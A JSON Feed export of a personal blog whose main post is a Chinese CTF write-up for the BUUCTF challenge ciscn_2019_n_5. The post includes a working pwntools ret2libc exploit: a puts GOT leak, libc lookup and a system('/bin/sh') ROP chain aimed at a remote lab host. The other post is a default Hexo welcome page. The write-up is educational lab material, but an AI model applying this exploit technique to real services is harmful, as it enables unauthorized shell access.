{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hyrink's Blog",
    "subtitle": "pwn & poet",
    "icon": "http://example.com/images/favicon.ico",
    "description": "I think therefore I am",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/04/03/pwn/",
            "url": "http://example.com/2023/04/03/pwn/",
            "title": "ret2libc & shellcode",
            "date_published": "2023-04-03T09:16:15.953Z",
            "content_html": "<h1 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> pwn</h1>\n<h2 id=\"stackoverflow\"><a class=\"anchor\" href=\"#stackoverflow\">#</a> stackoverflow</h2>\n<h3 id=\"ret2libc\"><a class=\"anchor\" href=\"#ret2libc\">#</a> ret2libc</h3>\n<h4 id=\"ciscn_2019_n_5\"><a class=\"anchor\" href=\"#ciscn_2019_n_5\">#</a> ciscn_2019_n_5</h4>\n<p>来自 buuctf：</p>\n<p>首先检查：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402172034111.png\" alt=\"image-20230402172034111\" /></p>\n<p>发现是 64 位，一个保护都没开。所以这里我用了两种做法：1.ret2shellcode    2.ret2libc</p>\n<h5 id=\"1ret2shellcode\"><a class=\"anchor\" href=\"#1ret2shellcode\">#</a> 1.ret2shellcode</h5>\n<p>先将程序拖进 ida64 查看反汇编：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402180754626.png\" alt=\"image-20230402180754626\" /></p>\n<p>查看 name：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402180926847.png\" alt=\"image-20230402180926847\" /></p>\n<p>可以知道<strong> name</strong> 在 bss 段，并且有 64 字节可写，于是我们可以往 bss 段写入 shellcode，再用<strong> gets (text)<strong> 返回 bss 段执行</strong> shellcode</strong>。</p>\n<p>所以有<strong> exp</strong>：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402181618672.png\" alt=\"image-20230402181618672\" /></p>\n<p>得到<strong> flag</strong>：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402181724035.png\" alt=\"image-20230402181724035\" /></p>\n<p><em><strong>successful</strong></em></p>\n<h5 id=\"2ret2libc\"><a class=\"anchor\" href=\"#2ret2libc\">#</a> 2.ret2libc</h5>\n<p>查看反汇编：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402181847339.png\" alt=\"image-20230402181847339\" /></p>\n<p>可知 gets 处有漏洞可以利用</p>\n<p>于是我们有以下思路：</p>\n<p><strong>1.<strong> 由于 puts 已经被调用过，所以</strong> puts</strong> 函数的 got 表中存放的已经是 libc 中的真实地址，又由于 4kb 页对齐原理，根据函数地址末三位可以泄露出 libc 的版本，从而获取<strong> system</strong> 和 **\\bin\\sh** 的真实地址。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">io=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">25388</span>)</span><br><span class=\"line\"><span class=\"comment\">#io= process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#host = &#x27;node4.buuoj.cn&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#port = 25388</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]   </span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0400713</span></span><br><span class=\"line\">ret = <span class=\"number\">0x04004c9</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload_rab = <span class=\"string\">b&#x27;a&#x27;</span>\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&#x27;tell me your name\\n&#x27;</span>,payload_rab)  //此处**read**函数用不到所以随意填充垃圾数据</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">8</span>)+flat([pop_rdi,puts_got,puts_plt,main])  //通过rdi寄存器传参，将**puts**函数的got表地址打印出来</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&#x27;What do you want to say to me?\\n&#x27;</span>,payload1)</span><br><span class=\"line\">puts_addr = u64(io.recv()[:<span class=\"number\">6</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))   //接收**puts**函数的真实地址(及上面打印出的got表地址)</span><br><span class=\"line\">                                              </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))                              </span><br><span class=\"line\"><span class=\"comment\">#u64(io.recv(6)[:-1].ljust(8,b&#x27;\\x00&#x27;))                                              </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>,puts_addr)      //利用LibcSearcher工具查询libc版本</span><br></pre></td></tr></table></figure></p>\n<p>这里要注意一点，我一开始接受真实地址用的是  **puts_addr = u64 (io.recv (6)[:-1].ljust (8,b'\\x00'))** 接收，一直报错，*timeout: the monitored command dumped core\\n' timeout: the monitored command dumped core'* 并且说连接不到端口，整了半天。实际上还是我对于 recv () 这条命令不了解</p>\n<p><strong>puts_addr = u64(io.recv(6)[:-1].ljust(8,b'\\x00'))<strong> 表示接受 6 字节长度，并将其切片，删掉最后一个字节，左对齐用 0 补齐。这样就会导致接收到的</strong> puts</strong> 的 got 表地址变化，从而报错。</p>\n<p>泄露 libc 版本之后就好写了：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc_base = puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)   //**计算基地址**</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">system = libc_base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)   //**通过基地址和偏移地址算出system的真实地址**</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\">binsh = libc_base + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)   //**同上**</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(binsh))</span><br><span class=\"line\">io.sendline(payload_rab)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">payload2=<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">8</span>)+ flat([pop_rdi,binsh,ret,system])  //此处要加一个**ret**进行栈平衡，原因没了解之后会去细看，大致就是因为ubuntu18上的在调用system函数时都要进行栈平衡，防止栈顶被破坏，导致程序崩溃</span><br><span class=\"line\">io.sendline(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>运行之后：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402202536850.png\" alt=\"image-20230402202536850\" /></p>\n<p>选择‘0‘。</p>\n<p>成功拿到 shell：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402202628954.png\" alt=\"image-20230402202628954\" /></p>\n<p>flag：</p>\n<p><img data-src=\"C:%5CUsers%5C%E8%83%A1%E5%AE%9C%E5%87%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230402202643138.png\" alt=\"image-20230402202643138\" /></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/04/02/hello-world/",
            "url": "http://example.com/2023/04/02/hello-world/",
            "title": "Hello World",
            "date_published": "2023-04-02T05:46:48.349Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}